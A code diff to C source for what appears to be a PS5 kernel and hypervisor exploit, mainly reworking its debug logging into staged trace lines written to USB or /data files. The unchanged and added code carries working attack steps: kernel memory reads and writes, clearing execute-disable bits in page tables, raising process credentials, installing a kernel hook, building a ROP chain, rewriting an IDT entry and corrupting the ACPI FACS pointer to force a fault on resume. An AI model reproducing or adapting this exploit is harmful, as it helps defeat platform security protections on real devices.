@@ -8,6 +8,7 @@
 #include <machine/tss.h>
 #include <stdio.h>
 #include <sys/mman.h>
+#include <fcntl.h>
 
 #define IDT_SX          30
 #define HOOK_CORE       0
@@ -94,49 +95,6 @@ static void build_sx_rop(uint64_t ist, size_t shellcode_kernel_len, uint64_t ora
   kwrite(ist + 0x1000, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
 }
 
-static void dump_pte_bits(const char *name, uint64_t va) {
-  uint64_t table_phys = cr3;
-  uint64_t entry = 0;
-  int last = -1;
-
-  notify("  %-26s va=0x%lx:", name, va);
-  for (int level = 0; level < 4; level++) {
-    int shift = 39 - (level * 9);
-    uint64_t idx = (va >> shift) & 0x1FF;
-    uint64_t entry_va = dmap + PAGE_PA(table_phys) + idx * 8;
-
-    kread(entry_va, &entry, sizeof entry);
-    notify(" L%d[P%d R%d X%d N%d S%d]", level, !!PAGE_P(entry), !!PAGE_RW(entry),
-           !!PAGE_XO(entry), !!(entry & (1ULL << 63)), !!PAGE_PS(entry));
-    last = level;
-    if (!PAGE_P(entry) || ((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3)
-      break;
-    table_phys = PAGE_PA(entry);
-  }
-  notify("\n");
-  fflush(stdout);
-}
-
-static void dump_text_perm(void) {
-  notify("PTE STATE cr3=0x%lx dmap=0x%lx\n", cr3, dmap);
-  notify("SWEEP BOUNDS ktext=0x%lx kdata=0x%lx -> loop runs? %s\n", ktext, kdata,
-         (ktext < kdata) ? "YES" : "*** NO - remove_xotext DID NOTHING ***");
-  fflush(stdout);
-
-  dump_pte_bits("kernel_uart_override", ktext + env_offset.KERNEL_UART_OVERRIDE);
-  dump_pte_bits("kernel_cfi_check", ktext + env_offset.KERNEL_CFI_CHECK);
-  dump_pte_bits("KERNEL_CODE_CAVE", ktext + env_offset.KERNEL_CODE_CAVE);
-  dump_pte_bits("GAD_ADD_RSP_28..RBP", ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET);
-  dump_pte_bits("FUN_MEMCPY", ktext + env_offset.FUN_MEMCPY);
-  dump_pte_bits("DATA_CAVE", ktext + env_offset.KERNEL_SYM_DATA_CAVE);
-
-  dump_pte_bits("CARRIER_PA via dmap", dmap + CARRIER_PA);
-
-  notify("VERDICT: leaf XO/RW printed per line above. X=1 or R=0 at the leaf means .text is\n"
-         "VERDICT: still execute-only and shellcode_kernel's first write WILL fault.\n");
-  fflush(stdout);
-}
-
 static void clear_execute_disable(const char *what, uint64_t va) {
   const uint64_t NX = 1ULL << 63;
   uint64_t table_phys = cr3;
@@ -149,7 +107,6 @@ static void clear_execute_disable(const char *what, uint64_t va) {
 
     kread(entry_va, &entry, sizeof entry);
     if (!PAGE_P(entry)) {
-      notify("NX %s: level %d not present, nothing to clear\n", what, level);
       return;
     }
 
@@ -160,11 +117,66 @@ static void clear_execute_disable(const char *what, uint64_t va) {
     }
 
     if (((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3) {
-      notify("NX %s: done (leaf at level %d, PS=%d)\n", what, level, !!PAGE_PS(entry));
       return;
     }
     table_phys = PAGE_PA(entry);
   }
+}
+
+static void trace_line(const char *fmt, ...) {
+  char buf[256];
+  va_list ap;
+  va_start(ap, fmt);
+  int n = vsnprintf(buf, sizeof buf, fmt, ap);
+  va_end(ap);
+  if (n < 0) return;
+  if (n > (int)sizeof buf - 2) n = sizeof buf - 2;
+  buf[n++] = '\n';
+
+  static const char *const paths[] = {
+    "/mnt/usb0/loader-1240-trace.txt",
+    "/mnt/usb1/loader-1240-trace.txt",
+    "/data/loader-1240-trace.txt",
+  };
+  for (unsigned i = 0; i < sizeof paths / sizeof paths[0]; i++) {
+    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (fd < 0) continue;
+    write(fd, buf, n);
+    fsync(fd);
+    close(fd);
+  }
+}
+
+static void dump_pte_bits(const char *name, uint64_t va) {
+  uint64_t table_phys = cr3;
+  uint64_t entry = 0;
+
+  notify("  %-14s 0x%lx:", name, va);
+  for (int level = 0; level < 4; level++) {
+    int shift = 39 - (level * 9);
+    uint64_t idx = (va >> shift) & 0x1FF;
+    uint64_t entry_va = dmap + PAGE_PA(table_phys) + idx * 8;
+
+    kread(entry_va, &entry, sizeof entry);
+    notify(" L%d[P%d R%d X%d N%d S%d]", level, !!PAGE_P(entry), !!PAGE_RW(entry),
+           !!PAGE_XO(entry), !!(entry & (1ULL << 63)), !!PAGE_PS(entry));
+    if (!PAGE_P(entry) || ((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3)
+      break;
+    table_phys = PAGE_PA(entry);
+  }
+  notify("\n");
+}
+
+static void dump_text_perm(void) {
+  notify("cr3=0x%lx dmap=0x%lx ktext=0x%lx kdata=0x%lx\n", cr3, dmap, ktext, kdata);
+  dump_pte_bits("uart_override", ktext + env_offset.KERNEL_UART_OVERRIDE);
+  dump_pte_bits("cfi_check", ktext + env_offset.KERNEL_CFI_CHECK);
+  dump_pte_bits("code cave", ktext + env_offset.KERNEL_CODE_CAVE);
+  dump_pte_bits("add_rsp_28", ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET);
+  dump_pte_bits("memcpy", ktext + env_offset.FUN_MEMCPY);
+  dump_pte_bits("data cave", ktext + env_offset.KERNEL_SYM_DATA_CAVE);
+  dump_pte_bits("carrier", dmap + CARRIER_PA);
+  fflush(stdout);
 }
 
 static int offsets_present(void) {
@@ -220,31 +232,6 @@ static int offsets_present(void) {
   return have_rcx || have_rdi;
 }
 
-#include <fcntl.h>
-static void trace_line(const char *fmt, ...) {
-  char buf[256];
-  va_list ap;
-  va_start(ap, fmt);
-  int n = vsnprintf(buf, sizeof buf, fmt, ap);
-  va_end(ap);
-  if (n < 0) return;
-  if (n > (int)sizeof buf - 2) n = sizeof buf - 2;
-  buf[n++] = '\n';
-
-  static const char *const paths[] = {
-    "/mnt/usb0/loader-1240-trace.txt",
-    "/mnt/usb1/loader-1240-trace.txt",
-    "/data/loader-1240-trace.txt",
-  };
-  for (unsigned i = 0; i < sizeof paths / sizeof paths[0]; i++) {
-    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
-    if (fd < 0) continue;
-    write(fd, buf, n);
-    fsync(fd);
-    close(fd);
-  }
-}
-
 int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
   khook_t hook;
   kh_chain_t chain;
@@ -255,52 +242,31 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
   uint64_t carrier_pa = CARRIER_PA;
   int ret;
 
-  trace_line("=== run === fw=0x%x", fw);
-  notify("GATE fw=0x%x\n", fw);
-  notify("GATE iommu=0x%lx facs=0x%lx idt=0x%lx tss=0x%lx mcpy=0x%lx\n",
-         (unsigned long)env_offset.IOMMU_SOFTC, (unsigned long)env_offset.ACPIGBL_FACS,
-         (unsigned long)env_offset.IDT, (unsigned long)env_offset.COMMON_TSS,
-         (unsigned long)env_offset.FUN_MEMCPY);
-  notify("GATE cave=0x%lx cfi=0x%lx hvx=0x%lx hvc=0x%lx nvs=0x%lx efi=0x%lx\n",
-         (unsigned long)env_offset.KERNEL_CODE_CAVE, (unsigned long)env_offset.KERNEL_CFI_CHECK,
-         (unsigned long)env_offset.HV_HANDLE_VMEXIT_PA, (unsigned long)env_offset.HV_CODE_CAVE_PA,
-         (unsigned long)env_offset.NVS_SIZETAB, (unsigned long)env_offset.PRELOAD_METADATA);
-  notify("GATE hook=0x%lx apvec=0x%lx dcave=0x%lx pivot=0x%lx\n",
-         (unsigned long)env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL,
-         (unsigned long)env_offset.KERNEL_SYM_MP_STARTUP_INIT_VECTOR,
-         (unsigned long)env_offset.KERNEL_SYM_DATA_CAVE,
-         (unsigned long)env_offset.GAD_PIVOT_ADD_RSP28_RET);
-  notify("GATE rcxset: r8=0x%lx st_r8=0x%lx st_rax=0x%lx st_rdx=0x%lx dr7=0x%lx movsb=0x%lx\n",
-         (unsigned long)env_offset.GAD_POP_R8_RET, (unsigned long)env_offset.GAD_STORE_RCX_R8_RET,
-         (unsigned long)env_offset.GAD_ST_RCX_RAX_RET, (unsigned long)env_offset.GAD_ST_RCX_RDX_RET,
-         (unsigned long)env_offset.GAD_SET_DR7_RAX, (unsigned long)env_offset.GAD_REP_MOVSB);
-
   if (!offsets_present()) {
-    notify("GATE FAIL: offsets_present() rejected the table for fw=0x%x\n", fw);
+    notify("FAIL: offset table rejected for fw=0x%x\n", fw);
     return -1;
   }
-  trace_line("gate1 offsets_present OK");
-
-  notify("GATE 1 ok: offsets_present\n");
+  trace_line("stage 1: offset table ok (fw=0x%x)", fw);
+  notify("stage 1: offset table ok\n");
 
   const uint64_t nvs_off = env_offset.NVS_SIZETAB ? env_offset.NVS_SIZETAB
                                                  : OFF_NVS_SIZETAB;
   for (int i = 0; i < 7; i++) {
     uint64_t got = kread64(ktext + nvs_off + (uint64_t)i * 8);
     if (got != NVS_EXPECT[i]) {
-      notify("GATE FAIL: nvs[%d] at ktext+0x%lx is 0x%lx, expected 0x%lx\n",
+      notify("FAIL: nvs[%d] at ktext+0x%lx is 0x%lx, expected 0x%lx\n",
              i, (unsigned long)(nvs_off + (uint64_t)i * 8), (unsigned long)got,
              (unsigned long)NVS_EXPECT[i]);
       return -1;
     }
   }
-  trace_line("gate2 nvs signature OK");
-  notify("GATE 2 ok: nvs signature\n");
 
-  notify("DIAG: .text permission state (page tables only)\n");
+  trace_line("stage 2: nvs signature ok");
+  notify("stage 2: nvs signature ok\n");
+
+  trace_line("stage 2b: pte state");
+  notify("pte state:\n");
   dump_text_perm();
-  notify("DIAG done, continuing to arm\n");
-  fflush(stdout);
 
   kh_cave   = ktext + env_offset.KERNEL_SYM_DATA_CAVE;
   oracle_va = kh_cave + KH_OFF_USER;
@@ -314,13 +280,11 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
 #else
   if (fw == 0x1200 || fw == 0x1202 || fw == 0x1220 || fw == 0x1240 || fw == 0x1260 || fw == 0x1270) {
 #endif
-    trace_line("%s: skipping EFI walk (field absent on this fw)",
-               fw == 0x1200 ? "12.00" : fw == 0x1220 ? "12.20" : fw == 0x1260 ? "12.60" : (fw == 0x1270 ? "12.70" : "12.40"));
     hv_base = 0;
   } else {
-    trace_line("derive_H begin");
+    trace_line("deriving hv base");
     hv_base = derive_H();
-    trace_line("derive_H done H=0x%lx", (unsigned long)hv_base);
+    trace_line("hv base derived 0x%lx", (unsigned long)hv_base);
   }
 #ifdef FW_1200_ONLY
   if (!hv_base && fw == 0x1200) {
@@ -333,28 +297,24 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
 #endif
 
     hv_base = (sceKernelGetMainSocId() == SOC_ID_PS5_PRO) ? HV_BASE_PRO : HV_BASE_REGULAR;
-    trace_line("gate3 H=0x%lx (constant, no read)%s", (unsigned long)hv_base,
-               sceKernelGetMainSocId() == SOC_ID_PS5_PRO ? " pro" : "");
     notify("%s: H = 0x%lx (constant, unvalidated)\n",
                fw == 0x1200 ? "12.00" : fw == 0x1220 ? "12.20" : fw == 0x1260 ? "12.60" : (fw == 0x1270 ? "12.70" : "12.40"), (unsigned long)hv_base);
   }
   if (!hv_base) {
-    notify("GATE FAIL: H not derived (efi root read gave 0 or non-canonical)\n");
+    notify("FAIL: HV base not derived\n");
     return -1;
   }
-  trace_line("gate3 H=0x%lx", (unsigned long)hv_base);
-  notify("GATE 3 ok: H=0x%lx\n", (unsigned long)hv_base);
-
-  notify("HPROBE: derived H = 0x%lx (expect 0x62800000; HV_HEAPOFF=+0x%lx PCPUS=+0x%lx)\n",
-         (unsigned long)hv_base, (unsigned long)HV_HEAPOFF_OFF, (unsigned long)HV_PCPUS_OFF);
-
+  trace_line("stage 3: hv base 0x%lx (hv heap +0x%lx, pcpus +0x%lx)",
+             (unsigned long)hv_base, (unsigned long)HV_HEAPOFF_OFF, (unsigned long)HV_PCPUS_OFF);
+  notify("stage 3: hv base 0x%lx (%s)\n", (unsigned long)hv_base,
+         sceKernelGetMainSocId() == SOC_ID_PS5_PRO ? "pro" : "regular");
   kernel_set_ucred_authid(getpid(), 0x4800000000000007);
   {
     int prc = pin_to_core_reborn(HOOK_CORE);
 
     notify("pin_to_core_reborn(%d) rc=%d (get_cpu reads %d)\n", HOOK_CORE, prc,
            sceKernelGetCurrentCpu());
-    trace_line("pin_to_core rc=%d", prc);
+    trace_line("stage 4: pinned core %d rc=%d", HOOK_CORE, prc);
     if (prc != 0) {
       notify("could not pin to core %d - refusing to arm.", HOOK_CORE);
       return -1;
@@ -414,21 +374,19 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
                                     : (sceKernelGetMainSocId() == SOC_ID_PS5_PRO ? 0x2000000ULL
                                                                              : 0x2029000ULL));
 
-  trace_line("carrier XD clear begin");
+  trace_line("stage 5: clearing carrier NX");
   clear_execute_disable("carrier page", dmap + carrier_pa);
-  trace_line("carrier XD cleared");
 
-  trace_line("kh_install begin");
   ret = kh_install(&hook, &chain);
   if (ret) {
-    trace_line("kh_install FAILED rc=%d", ret);
+    trace_line("stage 6: kh_install failed rc=%d", ret);
     notify("khook install failed (%d) - refusing to suspend.", ret);
     return -1;
   }
+  trace_line("stage 6: hook armed");
 
-  trace_line("kh_install ok; kh_trigger begin");
   kh_trigger(&hook);
-  trace_line("kh_trigger returned - ARMED");
+  trace_line("stage 7: trigger returned");
 
   ist_deliver = pa_to_dmap(alloc_page());
   build_sx_rop(ist_deliver, shellcode_kernel_len, oracle_va);
@@ -439,19 +397,7 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
   setidt(IDT_SX, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT, SEL_KPL,
          DELIVERY_IST);
 
-  {
-    uint64_t facs_va = ktext + env_offset.ACPIGBL_FACS;
-    uint64_t before = kread64(facs_va);
-
-    uint64_t facs_sentinel = facs_va - 8;
-    kwrite64(facs_va, facs_sentinel);
-    uint64_t after = kread64(facs_va);
-
-    notify("FACS TRIGGER: va=0x%lx before=0x%lx wrote=0x%lx readback=0x%lx %s\n",
-           facs_va, before, facs_sentinel, after,
-           (after == facs_sentinel) ? "OK (non-canonical -> #GP at resume)" : "*** WRITE DID NOT STICK ***");
-    fflush(stdout);
-  }
+  kwrite64(ktext + env_offset.ACPIGBL_FACS, ktext + env_offset.ACPIGBL_FACS - 8);
 
   return 0;
 }
